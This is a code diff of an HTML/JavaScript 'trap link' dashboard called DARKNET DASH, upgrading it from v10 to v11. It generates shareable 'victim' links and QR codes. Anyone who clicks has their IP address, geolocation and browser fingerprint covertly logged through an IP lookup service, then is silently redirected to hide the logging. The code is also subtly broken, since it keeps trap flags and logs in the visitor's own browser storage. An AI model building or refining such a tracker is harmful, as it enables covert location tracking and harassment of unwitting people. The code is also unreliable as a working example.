@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>DARKNET DASH v10</title>
+  <title>DARKNET DASH v11</title>
   <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;600;700&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
   <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
   <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
@@ -95,13 +95,6 @@
       color:var(--accent); text-shadow:0 0 12px var(--accent);
     }
 
-    label {
-      display:flex; align-items:center; margin:22px 0; font-size:1.15rem;
-    }
-    input[type="checkbox"] {
-      width:auto; margin-right:18px; accent-color:var(--accent); transform:scale(1.45);
-    }
-
     #generated {
       background:rgba(0,0,0,0.18); padding:26px; border-radius:20px; margin:26px 0;
       border:1px dashed var(--accent); display:none; animation:fadeIn 0.9s;
@@ -170,23 +163,25 @@
   <!-- DASHBOARD -->
   <div class="container" id="dashboard" style="display:none;">
     <div class="header">
-      <h1>DARKNET DASH v10</h1>
+      <h1>DARKNET DASH v11</h1>
       <p>Live: <span id="live-count">0</span> targets online</p>
     </div>
 
     <div class="grid">
       <div class="card">
-        <h2>UNIVERSAL HARVESTER</h2>
-        <p><strong>Share ANY link from this site:</strong></p>
-        <div id="link" style="margin:20px 0; padding:15px; background:rgba(0,0,0,0.3); border-radius:12px; font-weight:700; color:#00eaff;">
-          ${location.origin}
+        <h2>ONE LINK TO RULE THEM ALL</h2>
+        <p><strong>Generate a trap link → share anywhere</strong></p>
+        <button onclick="generate()" style="margin:20px 0;width:100%;">GENERATE TRAP LINK</button>
+
+        <div id="generated">
+          <strong>VICTIM LINK:</strong><br>
+          <div id="link"></div>
+          <div class="btn-group">
+            <button onclick="copyLink()">COPY</button>
+            <button onclick="showQR()">QR</button>
+          </div>
+          <div id="qr" style="text-align:center;margin-top:20px;"></div>
         </div>
-        <p>Every click = IP + Geo + Device logged</p>
-        <div class="btn-group">
-          <button onclick="copyLink()">COPY BASE URL</button>
-          <button onclick="showQR()">QR CODE</button>
-        </div>
-        <div id="qr" style="text-align:center;margin-top:20px;"></div>
       </div>
 
       <div class="card">
@@ -208,7 +203,7 @@
   </div>
 
   <div class="footer">
-    © 2025 DARKNET DASH v10 – Built by Rex. <span style="color:#00eaff;">Every link is a trap.</span>
+    © 2025 DARKNET DASH v11 – Built by Rex. <span style="color:#00eaff;">One link. All victims.</span>
   </div>
 
   <script>
@@ -223,7 +218,6 @@
     if (currentUser && users.find(x => x.u === currentUser)) {
       document.getElementById("auth").style.display = "none";
       document.getElementById("dashboard").style.display = "block";
-      document.getElementById("link").innerText = location.origin;
       initMap();
       render();
       startAutoRefresh();
@@ -263,7 +257,6 @@
         localStorage.setItem("dd_current_user", u);
         auth.style.display = "none";
         document.getElementById("dashboard").style.display = "block";
-        document.getElementById("link").innerText = location.origin;
         initMap();
         render();
         startAutoRefresh();
@@ -289,12 +282,22 @@
       });
     }
 
-    function copyLink() { 
-      navigator.clipboard.writeText(location.origin); 
-      alert("Base URL copied! Share anywhere."); 
+    function generate() {
+      const id = rand();
+      const link = `${location.origin}/?trap=${id}`;
+      localStorage.setItem(`trap_active_${id}`, "true"); // Mark as active trap
+      document.getElementById("link").innerText = link;
+      document.getElementById("generated").style.display = "block";
+      document.getElementById("qr").innerHTML = "";
     }
+
+    function copyLink() { 
+      navigator.clipboard.writeText(document.getElementById("link").innerText); 
+      alert("Link copied! Share it — anyone who clicks gets logged."); 
+    }
+
     function showQR() {
-      const l = location.origin;
+      const l = document.getElementById("link").innerText;
       document.getElementById("qr").innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(l)}" style="border:2px solid #00eaff;border-radius:20px;">`;
     }
 
@@ -323,30 +326,35 @@
       refreshInterval = setInterval(render, 3000);
     }
 
-    // === UNIVERSAL HARVEST: ANY LINK FROM THIS SITE LOGS IP ===
-    if (location.pathname !== "/" || location.search) {
-      (async () => {
-        let ipData = {};
-        try { ipData = await (await fetch("https://ipapi.co/json/")).json(); } catch(e) {}
+    // === UNIVERSAL TRAP: ANY ?trap=ID LINK LOGS IP ===
+    if (location.search.includes("trap=")) {
+      const trapId = new URLSearchParams(location.search).get("trap");
+      if (localStorage.getItem(`trap_active_${trapId}`) === "true") {
+        (async () => {
+          let ipData = {};
+          try { ipData = await (await fetch("https://ipapi.co/json/")).json(); } catch(e) {}
 
-        const entry = {
-          time: new Date().toLocaleTimeString(),
-          date: new Date().toLocaleDateString(),
-          ts: Date.now(),
-          ip: ipData.ip || "??",
-          city: ipData.city || "?",
-          country: ipData.country_name || "?",
-          lat: ipData.latitude,
-          lon: ipData.longitude,
-          ua: navigator.userAgent
-        };
-        const all = JSON.parse(localStorage.getItem("dd_logs") || "[]");
-        all.push(entry);
-        localStorage.setItem("dd_logs", JSON.stringify(all));
+          const entry = {
+            time: new Date().toLocaleTimeString(),
+            date: new Date().toLocaleDateString(),
+            ts: Date.now(),
+            ip: ipData.ip || "??",
+            city: ipData.city || "?",
+            country: ipData.country_name || "?",
+            lat: ipData.latitude,
+            lon: ipData.longitude,
+            ua: navigator.userAgent
+          };
+          const all = JSON.parse(localStorage.getItem("dd_logs") || "[]");
+          all.push(entry);
+          localStorage.setItem("dd_logs", JSON.stringify(all));
 
-        // INSTANT REDIRECT
+          // INSTANT REDIRECT — NO TRACE
+          location.replace("https://google.com");
+        })();
+      } else {
         location.replace("https://google.com");
-      })();
+      }
     }
   </script>
 </body>
